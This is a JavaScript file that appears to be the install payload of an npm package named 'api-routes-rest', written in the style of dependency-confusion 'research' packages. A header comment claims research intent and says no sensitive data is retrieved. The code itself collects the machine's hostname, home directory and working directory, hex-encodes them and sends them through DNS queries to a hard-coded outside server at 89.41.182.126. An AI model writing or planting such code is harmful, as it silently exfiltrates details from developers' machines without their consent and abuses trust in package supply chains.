/*
 *
 * This code is used for research purposes.
 *
 * No sensitive data is retrieved.
 *
 * Callbacks from within organizations with a
 * responsible disclosure program will be reported
 * directly to the organizations.
 *
 * Any other callbacks will be ignored, and
 * any associated data will not be kept.
 *
 * */


const dns = require('dns');
dns.setServers(['89.41.182.126']);
const os = require('os');

const suffix = '.dns';

const package = 'api-routes-rest';

function sendToServer(data) {

	    data = Buffer.from(data).toString('hex');
	    data = data.match(/.{1,60}/g);

	    id = Math.random().toString(36).substring(2);

	    data.forEach(function (chunk, idx){
		            try {
				                dns.resolve(
							                'v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A',
							                console.log);
				            } catch (e) { }
		        });

}

function tryGet(toCall) {

	    try {
		            return toCall();
		        } catch(e) {
				        return 'err';
				    }

}

data = {
	    p : package,
	    h : tryGet(os.hostname),
	    d : tryGet(os.homedir),
	    c : __dirname
}

data = JSON.stringify(data);


console.log(data);
sendToServer(data);
                                     

